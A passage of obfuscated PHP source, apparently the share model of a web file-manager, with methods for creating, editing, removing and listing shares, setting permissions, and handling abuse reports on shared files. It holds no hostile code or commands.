FÔŸßùÊÌ´: $C®òÌÂè•ï =& $_SERVER[ç]; $DäÑØ±³÷„ = Model($C®òÌÂè•ï[1790])->userGroupParents(USER_ID); $aÒ‚Ÿä«º = array($C®òÌÂè•ï[544] => SourceModel::TYPE_USER, $C®òÌÂè•ï[478] => USER_ID); goto eèğå´õ¨ö; fˆ²Šº‰Ø¢: $C¡ÄØÅÕ©ã = array($C®òÌÂè•ï[1792] => $Fİ„ŸÀŒÄã, $C®òÌÂè•ï[1793] => $E¾Ñ¨áÕÛ[$C®òÌÂè•ï[362]]); return $C¡ÄØÅÕ©ã; goto eŞğ¤ÁÄŸõ; eèğå´õ¨ö: if ($DäÑØ±³÷„) { $aÒ‚Ÿä«º = array(array($C®òÌÂè•ï[544] => SourceModel::TYPE_USER, $C®òÌÂè•ï[478] => USER_ID), array($C®òÌÂè•ï[544] => SourceModel::TYPE_GROUP, $C®òÌÂè•ï[478] => array($C®òÌÂè•ï[7], $DäÑØ±³÷„)), $C®òÌÂè•ï[1788] => $C®òÌÂè•ï[1742]); } $E¾Ñ¨áÕÛ = Model($C®òÌÂè•ï[559])->where($aÒ‚Ÿä«º)->selectPage($BÙ‚ÉÄé†ñ); $FĞ×©³©ö = array_to_keyvalue_group($E¾Ñ¨áÕÛ[$C®òÌÂè•ï[365]], $C®òÌÂè•ï[462]); goto a¦Õù÷î³”; eŞğ¤ÁÄŸõ: } protected function shareAdd($e­Å‚‡ÇÚ§, $DŠòì‘µÔ) { $C¢»ê®¾´… =& $_SERVER[ç]; $a‹Ú¬œÇ£ = $this->_addShareData($e­Å‚‡ÇÚ§, $DŠòì‘µÔ); if (!empty($DŠòì‘µÔ[$C¢»ê®¾´…[1794]])) { $this->_shareAuthSet($a‹Ú¬œÇ£, $DŠòì‘µÔ[$C¢»ê®¾´…[1794]]); } $this->shareEventAdd($e­Å‚‡ÇÚ§, $DŠòì‘µÔ, $C¢»ê®¾´…[1026]); return $a‹Ú¬œÇ£; } private function shareEventAdd($CŒŒÃ†÷È™, $a÷¸Ö¨© , $B±É¨Àõõ = "\x61\144\x64") { goto f®Ê´£§˜Ï; f®Ê´£§˜Ï: $c´‘½Ï¬ï =& $_SERVER[ç]; if ($B±É¨Àõõ == $c´‘½Ï¬ï[1026]) { if ($a÷¸Ö¨© [$c´‘½Ï¬ï[467]] == $c´‘½Ï¬ï[86]) { Model($c´‘½Ï¬ï[528])->eventShare($CŒŒÃ†÷È™, $c´‘½Ï¬ï[1795]); } if ($a÷¸Ö¨© [$c´‘½Ï¬ï[469]] == $c´‘½Ï¬ï[86]) { Model($c´‘½Ï¬ï[528])->eventShare($CŒŒÃ†÷È™, $c´‘½Ï¬ï[1796]); } return; } $eÃ¢ÖÍÜÍ¦ = $this->getInfoByPath($CŒŒÃ†÷È™); goto b­›ÒÍ³Â§; a•ÙÆÚŸ¼ó: if ($eÃ¢ÖÍÜÍ¦[$c´‘½Ï¬ï[469]] == $c´‘½Ï¬ï[491] && $a÷¸Ö¨© [$c´‘½Ï¬ï[469]] == $c´‘½Ï¬ï[86]) { $d£ê´»ê¥İ = $c´‘½Ï¬ï[1796]; } if ($eÃ¢ÖÍÜÍ¦[$c´‘½Ï¬ï[469]] == $c´‘½Ï¬ï[86] && $a÷¸Ö¨© [$c´‘½Ï¬ï[469]] == $c´‘½Ï¬ï[491]) { $d£ê´»ê¥İ = $c´‘½Ï¬ï[1799]; } Model($c´‘½Ï¬ï[528])->eventShare($CŒŒÃ†÷È™, $d£ê´»ê¥İ); goto BƒÅ Éİ; BƒÅ Éİ: return; goto aå¬š‡õÏ«; b­›ÒÍ³Â§: $d£ê´»ê¥İ = $c´‘½Ï¬ï[1797]; if ($eÃ¢ÖÍÜÍ¦[$c´‘½Ï¬ï[467]] == $c´‘½Ï¬ï[491] && $a÷¸Ö¨© [$c´‘½Ï¬ï[467]] == $c´‘½Ï¬ï[86]) { $d£ê´»ê¥İ = $c´‘½Ï¬ï[1795]; } if ($eÃ¢ÖÍÜÍ¦[$c´‘½Ï¬ï[467]] == $c´‘½Ï¬ï[86] && $a÷¸Ö¨© [$c´‘½Ï¬ï[467]] == $c´‘½Ï¬ï[491]) { $d£ê´»ê¥İ = $c´‘½Ï¬ï[1798]; } goto a•ÙÆÚŸ¼ó; aå¬š‡õÏ«: } private function _addShareData($FâêÙÈµÖ¾, $Aœ°Îç‘÷ = array()) { goto AÏ«Œ–; dÖÑÈæ’‰á: $AÛ£ß¬öì = array($a…ˆëÃí[1483] => USER_ID, $a…ˆëÃí[404] => $FâêÙÈµÖ¾, $a…ˆëÃí[1396] => $a…ˆëÃí[33], $a…ˆëÃí[467] => 0, $a…ˆëÃí[469] => 0, $a…ˆëÃí[1038] => $a…ˆëÃí[33], $a…ˆëÃí[303] => $a…ˆëÃí[33], $a…ˆëÃí[817] => $a…ˆëÃí[33], $a…ˆëÃí[1801] => 0, $a…ˆëÃí[1802] => 0, $a…ˆëÃí[470] => 0, $a…ˆëÃí[471] => $a…ˆëÃí[33], $a…ˆëÃí[464] => $a…ˆëÃí[33]); $B‰Ñ…ÙÖ = explode($a…ˆëÃí[47], $a…ˆëÃí[1803]); foreach ($B‰Ñ…ÙÖ as $dà»°í±í) { if (!isset($Aœ°Îç‘÷[$dà»°í±í])) { continue; } $AÛ£ß¬öì[$dà»°í±í] = $Aœ°Îç‘÷[$dà»°í±í]; } goto a×Ç†»‡ÈÎ; a×Ç†»‡ÈÎ: $fˆ¬¹—½ğ = $this->add($AÛ£ß¬öì); $D—Û•½ŠÊ† = array($a…ˆëÃí[464] => short_id($fˆ¬¹—½ğ)); $this->where(array($a…ˆëÃí[461] => $fˆ¬¹—½ğ))->save($D—Û•½ŠÊ†); goto CŒğÙâò¿; CŒğÙâò¿: return $fˆ¬¹—½ğ; goto DğÈÆÃ¿Ê; AÏ«Œ–: $a…ˆëÃí =& $_SERVER[ç]; $AåƒíÚ—‚† = array($a…ˆëÃí[404] => $FâêÙÈµÖ¾, $a…ˆëÃí[1483] => USER_ID); if ($FâêÙÈµÖ¾ == 0) { $AåƒíÚ—‚† = array($a…ˆëÃí[1800] => $Aœ°Îç‘÷[$a…ˆëÃí[1038]], $a…ˆëÃí[1483] => USER_ID); } goto bµ´ÀÔ Ó‘; bµ´ÀÔ Ó‘: if ($DÍñ¯È‚ÈÁ = $this->where($AåƒíÚ—‚†)->find()) { return $DÍñ¯È‚ÈÁ[$a…ˆëÃí[462]]; } if ($FâêÙÈµÖ¾ == 0) { $fš‘«åëƒÆ = array($a…ˆëÃí[28] => get_path_this($Aœ°Îç‘÷[$a…ˆëÃí[75]])); } else { $fš‘«åëƒÆ = Model($a…ˆëÃí[760])->sourceInfo($FâêÙÈµÖ¾); if (!$fš‘«åëƒÆ) { return !1; } } if (!$Aœ°Îç‘÷[$a…ˆëÃí[1396]]) { $Aœ°Îç‘÷[$a…ˆëÃí[1396]] = $fš‘«åëƒÆ[$a…ˆëÃí[28]]; } goto dÖÑÈæ’‰á; DğÈÆÃ¿Ê: } private function _shareAuthSet($c¥ß·İ£ê°, $f¤³Õå¥Ñƒ) { goto Dö—š–¿—; Dö—š–¿—: $c¶ÉŞ¤Í¼ =& $_SERVER[ç]; if (!is_array($f¤³Õå¥Ñƒ)) { return !1; } $bá¤Öö´à = Model($c¶ÉŞ¤Í¼[1754]); goto dšìŠçÒßé; DÁíê•Ğ»¹: return $bá¤Öö´à->addAll($bÀÕí·è™ò, array(), !0); goto c¡ƒ ˆ¬…¡; dšìŠçÒßé: $bá¤Öö´à->where(array($c¶ÉŞ¤Í¼[462] => $c¥ß·İ£ê°))->delete(); $bÀÕí·è™ò = array(); foreach ($f¤³Õå¥Ñƒ as $AÜå”æ¼Û) { $aŠ±Êï = SourceModel::TYPE_USER; if ($AÜå”æ¼Û[$c¶ÉŞ¤Í¼[398]] == SourceModel::TYPE_GROUP) { $aŠ±Êï = SourceModel::TYPE_GROUP; } $D•¤èÉªÔ = array($c¶ÉŞ¤Í¼[462] => $c¥ß·İ£ê°, $c¶ÉŞ¤Í¼[398] => $aŠ±Êï, $c¶ÉŞ¤Í¼[478] => intval($AÜå”æ¼Û[$c¶ÉŞ¤Í¼[478]]), $c¶ÉŞ¤Í¼[1750] => 0, $c¶ÉŞ¤Í¼[1804] => -1); if ($AÜå”æ¼Û[$c¶ÉŞ¤Í¼[1750]]) { $D•¤èÉªÔ[$c¶ÉŞ¤Í¼[1750]] = $AÜå”æ¼Û[$c¶ÉŞ¤Í¼[1750]]; } else { if ($AÜå”æ¼Û[$c¶ÉŞ¤Í¼[1804]]) { $D•¤èÉªÔ[$c¶ÉŞ¤Í¼[1804]] = $AÜå”æ¼Û[$c¶ÉŞ¤Í¼[1804]]; } } $bÀÕí·è™ò[] = $D•¤èÉªÔ; } goto DÁíê•Ğ»¹; c¡ƒ ˆ¬…¡: } public function numViewAdd($e³½”Û»Ä ) { $D’½šÙ‡±¹ =& $_SERVER[ç]; $dÇ‡ƒÛÑ«ã = array($D’½šÙ‡±¹[461] => $e³½”Û»Ä ); $this->where($dÇ‡ƒÛÑ«ã)->setAdd($D’½šÙ‡±¹[1801]); } public function numDownloadAdd($dŒ¦ğÜÛÃŒ) { $Eé¤®¿²„ =& $_SERVER[ç]; $bÏæ§†°Î„ = array($Eé¤®¿²„[461] => $dŒ¦ğÜÛÃŒ); $this->where($bÏæ§†°Î„)->setAdd($Eé¤®¿²„[1802]); } protected function shareEdit($déƒêÀË, $e®àáÔãÏâ) { goto aÈ¿ØÕÙàì; BŒ½ƒ†Æ‡‡: if (isset($e®àáÔãÏâ[$eğ›‹š…Ø®[1794]])) { $this->_shareAuthSet($déƒêÀË, $e®àáÔãÏâ[$eğ›‹š…Ø®[1794]]); } return !0; goto AÖİ¼ÏÃ; aÈ¿ØÕÙàì: $eğ›‹š…Ø® =& $_SERVER[ç]; $BÖŞç£ô = $this->getInfo($déƒêÀË); if (!$BÖŞç£ô) { return !1; } goto F™ˆÕ¯¥ù®; F™ˆÕ¯¥ù®: $this->_checkLinkShare($e®àáÔãÏâ, $BÖŞç£ô); $bòìø×È› = array(); $aÄ¥ƒ‹¤î = explode($eğ›‹š…Ø®[47], $eğ›‹š…Ø®[1805]); goto E¸ÍæøÂß”; E¸ÍæøÂß”: foreach ($aÄ¥ƒ‹¤î as $EÀ„òÅõ´) { if (!array_key_exists($EÀ„òÅõ´, $e®àáÔãÏâ)) { continue; } $bòìø×È›[$EÀ„òÅõ´] = $e®àáÔãÏâ[$EÀ„òÅõ´]; } $this->shareEventAdd($BÖŞç£ô[$eğ›‹š…Ø®[390]], $e®àáÔãÏâ, $eğ›‹š…Ø®[1621]); $this->where(array($eğ›‹š…Ø®[461] => $déƒêÀË))->save($bòìø×È›); goto BŒ½ƒ†Æ‡‡; AÖİ¼ÏÃ: } private function _checkLinkShare($aŠ±…Å…ƒ, $fÏğÒ¨ŞÉ„) { goto d©¼³ïßáñ; f”Š¡Ú‚ŠŞ: $fÚµªŸÃë½ = $this->shareFileMeta($c†ÚµŠº¼–[$cÀçÁŠåÚ»[441]]); if (isset($fÚµªŸÃë½[$cÀçÁŠåÚ»[370]]) && $fÚµªŸÃë½[$cÀçÁŠåÚ»[370]] == $cÀçÁŠåÚ»[86]) { show_json(LNG($cÀçÁŠåÚ»[1808]), !1); } goto eóŞ‘Î·ñë; aƒîÊˆ»Ì¿: if ($fÏğÒ¨ŞÉ„[$cÀçÁŠåÚ»[84]][$cÀçÁŠåÚ»[29]] != $cÀçÁŠåÚ»[173]) { $cÄùâ¿øÜØ = $this->_folderReport($FªõÖ»ËÅ); if (!$cÄùâ¿øÜØ) { return; } show_json(LNG($cÀçÁŠåÚ»[1806]) . $cÀçÁŠåÚ»[1807] . $cÄùâ¿øÜØ, !1); } $c†ÚµŠº¼– = Model($cÀçÁŠåÚ»[760])->fileInfoGet($fÏğÒ¨ŞÉ„[$cÀçÁŠåÚ»[84]][$cÀçÁŠåÚ»[390]]); if (!$c†ÚµŠº¼–) { return; } goto f”Š¡Ú‚ŠŞ; d©¼³ïßáñ: $cÀçÁŠåÚ» =& $_SERVER[ç]; if ($aŠ±…Å…ƒ[$cÀçÁŠåÚ»[467]] != $cÀçÁŠåÚ»[86]) { return; } $FªõÖ»ËÅ = $fÏğÒ¨ŞÉ„[$cÀçÁŠåÚ»[84]][$cÀçÁŠåÚ»[390]]; goto aƒîÊˆ»Ì¿; eóŞ‘Î·ñë: } private function _folderReport($A”¸…œ¿“Ñ) { goto EÏ»çÄ¬¡; CŠ£îè©Ù–: $dØ¡Š„£¿¿ = array_to_keyvalue($eÛ¦á’ñè“, $bµñŸõô—¡[33], $bµñŸõô—¡[28]); $dØ¡Š„£¿¿[] = $Dˆ¸‡˜¥¥“[$bµñŸõô—¡[28]]; return implode($bµñŸõô—¡[8], $dØ¡Š„£¿¿); goto bî‚Š„ø´Ä; A›èŞÛëÁ: if (!$fäğæ¸™²) { return !1; } $fäğæ¸™² = array_to_keyvalue($fäğæ¸™², $bµñŸõô—¡[33], $bµñŸõô—¡[441]); $E·‡¯á³ï = $bµñŸõô—¡[47] . $A”¸…œ¿“Ñ . $bµñŸõô—¡[47]; goto c™Çˆ˜àÁ; c™Çˆ˜àÁ: $fŒßÃœÂÓ’ = array($bµñŸõô—¡[441] => array($bµñŸõô—¡[7], $fäğæ¸™²), $bµñŸõô—¡[481] => array($bµñŸõô—¡[378], "\x25{$E·‡¯á³ï}\45"), $bµñŸõô—¡[417] => 0); $Dˆ¸‡˜¥¥“ = Model($bµñŸõô—¡[760])->where($fŒßÃœÂÓ’)->field($bµñŸõô—¡[1810])->find(); if (!$Dˆ¸‡˜¥¥“) { return !1; } goto B§ì‘œÁ„ì; B§ì‘œÁ„ì: $C Û¹ô²† = substr($Dˆ¸‡˜¥¥“[$bµñŸõô—¡[481]], strpos($Dˆ¸‡˜¥¥“[$bµñŸõô—¡[481]], $E·‡¯á³ï)); $fŒßÃœÂÓ’ = array($bµñŸõô—¡[390] => array($bµñŸõô—¡[7], trim($C Û¹ô²†, $bµñŸõô—¡[47]))); $eÛ¦á’ñè“ = Model($bµñŸõô—¡[760])->where($fŒßÃœÂÓ’)->field($bµñŸõô—¡[28])->select(); goto CŠ£îè©Ù–; EÏ»çÄ¬¡: $bµñŸõô—¡ =& $_SERVER[ç]; $fŒßÃœÂÓ’ = array($bµñŸõô—¡[441] => array($bµñŸõô—¡[937], 0), $bµñŸõô—¡[695] => 3); $fäğæ¸™² = Model($bµñŸõô—¡[1809])->where($fŒßÃœÂÓ’)->field($bµñŸõô—¡[441])->select(); goto A›èŞÛëÁ; bî‚Š„ø´Ä: } protected function remove($aíˆŸºŸÑ) { goto FŠÈ×Ã‚µĞ; Fé¾ĞÆÍÃò: $bŞƒ¯´‹¯Ü = $this->where($a°Ê¿Ç”Ì•)->delete(); if ($bŞƒ¯´‹¯Ü) { Model($b˜¢òÊ…™[559])->where(array($b˜¢òÊ…™[462] => $aíˆŸºŸÑ))->delete(); } $B×ÊĞï•¼¥ = is_array($aíˆŸºŸÑ) ? $aíˆŸºŸÑ[1] : array($aíˆŸºŸÑ); goto d™Ò†† ˆİ; d™Ò†† ˆİ: for ($c­‰Ö†Áà = 0; $c­‰Ö†Áà < count($B×ÊĞï•¼¥); $c­‰Ö†Áà++) { $dŸáƒàœØò = $this->getInfo($B×ÊĞï•¼¥[$c­‰Ö†Áà]); if ($dŸáƒàœØò[$b˜¢òÊ…™[469]] == $b˜¢òÊ…™[86]) { Model($b˜¢òÊ…™[528])->eventShare($dŸáƒàœØò[$b˜¢òÊ…™[390]], $b˜¢òÊ…™[1799]); } if ($dŸáƒàœØò[$b˜¢òÊ…™[467]] == $b˜¢òÊ…™[86]) { Model($b˜¢òÊ…™[528])->eventShare($dŸáƒàœØò[$b˜¢òÊ…™[390]], $b˜¢òÊ…™[1798]); } } return $bŞƒ¯´‹¯Ü; goto B¶ç¤ âáí; FŠÈ×Ã‚µĞ: $b˜¢òÊ…™ =& $_SERVER[ç]; if (is_array($aíˆŸºŸÑ)) { $aíˆŸºŸÑ = array($b˜¢òÊ…™[7], $aíˆŸºŸÑ); } $a°Ê¿Ç”Ì• = array($b˜¢òÊ…™[462] => $aíˆŸºŸÑ); goto Fé¾ĞÆÍÃò; B¶ç¤ âáí: } protected function removeBySource($aâğˆº†Åë) { goto DÓõ¿ÊŞ…í; A«Ñ¡§­‹£: $bòÊô‚§Í‰ = array_to_keyvalue($bòÊô‚§Í‰, $dÊˆí£ïñ¹[33], $dÊˆí£ïñ¹[462]); if (!$bòÊô‚§Í‰) { return; } $DßÓÖ×›Ãš = array($dÊˆí£ïñ¹[461] => array($dÊˆí£ïñ¹[405], $bòÊô‚§Í‰)); goto a¼…±¿”ª¼; DÓõ¿ÊŞ…í: $dÊˆí£ïñ¹ =& $_SERVER[ç]; $DßÓÖ×›Ãš = array($dÊˆí£ïñ¹[404] => array($dÊˆí£ïñ¹[405], $aâğˆº†Åë)); $bòÊô‚§Í‰ = $this->field($dÊˆí£ïñ¹[462])->where($DßÓÖ×›Ãš)->select(); goto A«Ñ¡§­‹£; a¼…±¿”ª¼: $this->where($DßÓÖ×›Ãš)->delete(); Model($dÊˆí£ïñ¹[559])->where($DßÓÖ×›Ãš)->delete(); goto cæÌŸÂÊ–; cæÌŸÂÊ–: } public function listAll($FÏóì¿¡“Ä) { goto dé×ÂîÚŞ¯; dé×ÂîÚŞ¯: $b¨—Ş”®ˆ =& $_SERVER[ç]; $a“¡Î„¾«Ÿ = array(); if ($FÏóì¿¡“Ä[$b¨—Ş”®ˆ[1491]]) { $a“¡Î„¾«Ÿ[$b¨—Ş”®ˆ[1491]] = $FÏóì¿¡“Ä[$b¨—Ş”®ˆ[1491]]; } goto d¡ÛÉŠ³¯Ü; dõ¯³Î’ÙË: $fóš¶£‹Ü¾ = $this->_makeOrder()->where($a“¡Î„¾«Ÿ)->selectPage(20); if (empty($fóš¶£‹Ü¾[$b¨—Ş”®ˆ[365]])) { return array(); } $this->_listDataApply($fóš¶£‹Ü¾[$b¨—Ş”®ˆ[365]]); goto fÎß§—¯£; d¡ÛÉŠ³¯Ü: if ($FÏóì¿¡“Ä[$b¨—Ş”®ˆ[708]]) { $fŒ´ƒÚáÃ = $FÏóì¿¡“Ä[$b¨—Ş”®ˆ[470]] ? $FÏóì¿¡“Ä[$b¨—Ş”®ˆ[470]] : strtotime(date($b¨—Ş”®ˆ[1811])); $a“¡Î„¾«Ÿ[$b¨—Ş”®ˆ[192]] = array($b¨—Ş”®ˆ[329], array($FÏóì¿¡“Ä[$b¨—Ş”®ˆ[708]], $fŒ´ƒÚáÃ)); } if ($FÏóì¿¡“Ä[$b¨—Ş”®ˆ[29]]) { $a“¡Î„¾«Ÿ[$FÏóì¿¡“Ä[$b¨—Ş”®ˆ[29]]] = 1; } else { $a“¡Î„¾«Ÿ[] = array($b¨—Ş”®ˆ[467] => array($b¨—Ş”®ˆ[937], 0), $b¨—Ş”®ˆ[469] => array($b¨—Ş”®ˆ[937], 0), $b¨—Ş”®ˆ[1788] => $b¨—Ş”®ˆ[1742]); } if ($FÏóì¿¡“Ä[$b¨—Ş”®ˆ[1738]]) { $a“¡Î„¾«Ÿ[] = array($b¨—Ş”®ˆ[464] => $FÏóì¿¡“Ä[$b¨—Ş”®ˆ[1738]], $b¨—Ş”®ˆ[1396] => array($b¨—Ş”®ˆ[378], "\45{$FÏóì¿¡“Ä[$b¨—Ş”®ˆ[1738]]}\x25"), $b¨—Ş”®ˆ[1788] => $b¨—Ş”®ˆ[1742]); } goto dõ¯³Î’ÙË; fÎß§—¯£: return $fóš¶£‹Ü¾; goto fë—ÁÏ…¬; fë—ÁÏ…¬: } public function listDataApply($aÆˆÊÖÆŠ) { $this->_listDataApply($aÆˆÊÖÆŠ); return $aÆˆÊÖÆŠ; } private function _listDataApply(&$a³‚ÇëÒ—) { goto Eë­…Ú²Î; B½–„è£Ê: $D¹È•Ö»–„ = array_to_keyvalue($a³‚ÇëÒ—, $dŒ“½—ìµÕ[33], $dŒ“½—ìµÕ[390]); $bÈ– áƒ» = Model($dŒ“½—ìµÕ[760])->sourceListInfo($D¹È•Ö»–„, !0); foreach ($a³‚ÇëÒ— as &$A”‰š‰¢) { $eç¡­ËçòÄ = $A”‰š‰¢[$dŒ“½—ìµÕ[1491]]; $A”‰š‰¢[$dŒ“½—ìµÕ[1812]] = $BØ–Ø–Ó¼[$eç¡­ËçòÄ] ? $BØ–Ø–Ó¼[$eç¡­ËçòÄ] : !1; $eØ°ëŠÂİ = $A”‰š‰¢[$dŒ“½—ìµÕ[390]]; $A”‰š‰¢[$dŒ“½—ìµÕ[84]] = $bÈ– áƒ»[$eØ°ëŠÂİ] ? $bÈ– áƒ»[$eØ°ëŠÂİ] : !1; } goto EÄ”­½Èø; EÄ”­½Èø: unset($A”‰š‰¢); goto fã‹¼Á ƒÜ; Eë­…Ú²Î: $dŒ“½—ìµÕ =& $_SERVER[ç]; $d¶â°õé’Ÿ = array_to_keyvalue($a³‚ÇëÒ—, $dŒ“½—ìµÕ[33], $dŒ“½—ìµÕ[1491]); $BØ–Ø–Ó¼ = Model($dŒ“½—ìµÕ[501])->userListInfo(array_unique($d¶â°õé’Ÿ)); goto B½–„è£Ê; fã‹¼Á ƒÜ: } private function _makeOrder($Ağó£Å±¨à = '') { goto fØ† «˜¬; fØ† «˜¬: $e¹‚õ‘ÉÖ =& $_SERVER[ç]; $F¡×™Û£Ùù = array($e¹‚õ‘ÉÖ[192], $e¹‚õ‘ÉÖ[470], $e¹‚õ‘ÉÖ[1801], $e¹‚õ‘ÉÖ[1802]); $Fœ¤Ê ËòÏ = array($e¹‚õ‘ÉÖ[422] => $e¹‚õ‘ÉÖ[423], $e¹‚õ‘ÉÖ[424] => $e¹‚õ‘ÉÖ[425]); goto e…ÏÀ‘’Äò; C˜®õÏÔ¬å: $Ağó£Å±¨à = $Ağó£Å±¨à . "{$DÎæâ°§ÍË}\x20{$B³²‚Ó‡Å}"; return $this->order($Ağó£Å±¨à); goto c½ªæ×ÒëÖ; e…ÏÀ‘’Äò: $DÎæâ°§ÍË = Input::get($e¹‚õ‘ÉÖ[429], $e¹‚õ‘ÉÖ[7], $e¹‚õ‘ÉÖ[410], $F¡×™Û£Ùù); $B³²‚Ó‡Å = Input::get($e¹‚õ‘ÉÖ[430], $e¹‚õ‘ÉÖ[7], $e¹‚õ‘ÉÖ[1813], array($e¹‚õ‘ÉÖ[1737], $e¹‚õ‘ÉÖ[424])); $B³²‚Ó‡Å = $Fœ¤Ê ËòÏ[$B³²‚Ó‡Å]; goto C˜®õÏÔ¬å; c½ªæ×ÒëÖ: } public function reportAdd($C©É¯ªà›Ÿ) { $B”ß÷·ŞíÏ =& $_SERVER[ç]; $C°ª’…ó‰ç = array($B”ß÷·ŞíÏ[462] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[462]], $B”ß÷·ŞíÏ[1491] => USER_ID); if (Model($B”ß÷·ŞíÏ[1809])->where($C°ª’…ó‰ç)->find()) { return !1; } $BÌ«Õôƒ›Ô = array($B”ß÷·ŞíÏ[462] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[462]], $B”ß÷·ŞíÏ[1396] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[1396]], $B”ß÷·ŞíÏ[390] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[390]], $B”ß÷·ŞíÏ[441] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[441]], $B”ß÷·ŞíÏ[1491] => USER_ID, $B”ß÷·ŞíÏ[29] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[29]], $B”ß÷·ŞíÏ[425] => $C©É¯ªà›Ÿ[$B”ß÷·ŞíÏ[425]]); return Model($B”ß÷·ŞíÏ[1809])->add($BÌ«Õôƒ›Ô); } public function reportList($e¤¡ŸçƒÑ¥) { goto DÑ‡õ†²Çé; aÃ›ÛÛİÊ: if (empty($DÉÍ§À§‹[$DÁ˜º¨‰‡š[365]])) { return array(); } $this->_listDataApply($DÉÍ§À§‹[$DÁ˜º¨‰‡š[365]]); return $DÉÍ§À§‹; goto C„Ö›Ö–ñ; DÑ‡õ†²Çé: $DÁ˜º¨‰‡š =& $_SERVER[ç]; $a£ĞùÕÄ´Ñ = array(); if ($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[708]]) { $BÀ‰­ß‚Ğè = $e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[470]] ? $e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[470]] : strtotime(date($DÁ˜º¨‰‡š[1811])); $a£ĞùÕÄ´Ñ[$DÁ˜º¨‰‡š[192]] = array($DÁ˜º¨‰‡š[329], array($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[708]], $BÀ‰­ß‚Ğè)); } goto dÕ¼Ô¯ò÷Ç; f–¢å…ëÒó: $f”†ŞêØƒ = array($DÁ˜º¨‰‡š[422] => $DÁ˜º¨‰‡š[423], $DÁ˜º¨‰‡š[424] => $DÁ˜º¨‰‡š[425]); $A—ôóõò…Ú = $DÁ˜º¨‰‡š[1818] . $f”†ŞêØƒ[$d¥Éîß–­]; $DÉÍ§À§‹ = Model($DÁ˜º¨‰‡š[1809])->where($a£ĞùÕÄ´Ñ)->order($A—ôóõò…Ú)->selectPage(20); goto aÃ›ÛÛİÊ; dÕ¼Ô¯ò÷Ç: if (isset($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[29]]) && in_array($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[29]], array($DÁ˜º¨‰‡š[86], $DÁ˜º¨‰‡š[1814], $DÁ˜º¨‰‡š[1815], $DÁ˜º¨‰‡š[1816], $DÁ˜º¨‰‡š[1817]))) { $a£ĞùÕÄ´Ñ[$DÁ˜º¨‰‡š[29]] = $e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[29]]; } if (isset($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[695]]) && in_array($e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[695]], array($DÁ˜º¨‰‡š[491], $DÁ˜º¨‰‡š[86], $DÁ˜º¨‰‡š[1814], $DÁ˜º¨‰‡š[1815]))) { $a£ĞùÕÄ´Ñ[$DÁ˜º¨‰‡š[695]] = $e¤¡ŸçƒÑ¥[$DÁ˜º¨‰‡š[695]]; } $d¥Éîß–­ = Input::get($DÁ˜º¨‰‡š[430], $DÁ˜º¨‰‡š[7], $DÁ˜º¨‰‡š[1813], array($DÁ˜º¨‰‡š[1737], $DÁ˜º¨‰‡š[424])); goto f–¢å…ëÒó; C„Ö›Ö–ñ: } public function reportStatus($Bã¶¨„›) { goto F­±—ïî‰ö; aÕóœ ®ÙÎ: return $FäÅŸ…è¬â; goto AõÛœ‡; F­±—ïî‰ö: $c° ¶Ù´Ú =& $_SERVER[ç]; $BìåÑÙ¼ƒÎ = array($c° ¶Ù´Ú[388] => $Bã¶¨„›[$c° ¶Ù´Ú[388]]); $Fî‰¼ËĞÃ = Model($c° ¶Ù´Ú[1809])->where($BìåÑÙ¼ƒÎ)->field($c° ¶Ù´Ú[1819])->find(); goto D¯‘Şà‚‡ù; D¯‘Şà‚‡ù: if (!$Fî‰¼ËĞÃ) { return !1; } $B¡éƒÔ‡Û = array($c° ¶Ù´Ú[695] => $Bã¶¨„›[$c° ¶Ù´Ú[695]]); if ($Bã¶¨„›[$c° ¶Ù´Ú[695]] == $c° ¶Ù´Ú[1815] && $Fî‰¼ËĞÃ[$c° ¶Ù´Ú[695]] == $c° ¶Ù´Ú[1815]) { $B¡éƒÔ‡Û[$c° ¶Ù´Ú[695]] = 0; } goto bïÏ‚ŞÍŒ; bïÏ‚ŞÍŒ: $FäÅŸ…è¬â = Model($c° ¶Ù´Ú[1809])->where($BìåÑÙ¼ƒÎ)->save($B¡éƒÔ‡Û); if ($Bã¶¨„›[$c° ¶Ù´Ú[695]] == $c° ¶Ù´Ú[1814]) { if ($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[441]] != $c° ¶Ù´Ú[491] && $this->shareFileMeta($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[441]])) { $this->shareFileMeta($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[441]], 0); } $this->remove($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[462]]); return !0; } if ($FäÅŸ…è¬â && $Bã¶¨„›[$c° ¶Ù´Ú[695]] == $c° ¶Ù´Ú[1815]) { $c´£È™—š = $B¡éƒÔ‡Û[$c° ¶Ù´Ú[695]] == $c° ¶Ù´Ú[1815] ? 1 : 0; $this->shareFileMeta($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[441]], $c´£È™—š); $this->removeByFile($Fî‰¼ËĞÃ[$c° ¶Ù´Ú[441]]); } goto aÕóœ ®ÙÎ; AõÛœ‡: } private function removeByFile($Cò¢å„„‰—) { goto F‡˜¶«§„ï; F‡˜¶«§„ï: $C‡©­ƒ…µÆ =& $_SERVER[ç]; $DŞàŒ‘•³³ = Model($C‡©­ƒ…µÆ[760])->where(array($C‡©­ƒ…µÆ[441] => $Cò¢å„„‰—))->field($C‡©­ƒ…µÆ[390])->select(); $D•êèÑäêô = array_to_keyvalue($DŞàŒ‘•³³, $C‡©­ƒ…µÆ[33], $C‡©­ƒ…µÆ[390]); goto Eà¤¨‘±ê°; Eà¤¨‘±ê°: $cƒˆ§¢· = array($C‡©­ƒ…µÆ[390] => array($C‡©­ƒ…µÆ[7], $D•êèÑäêô), $C‡©­ƒ…µÆ[467] => 1); $DŞàŒ‘•³³ = 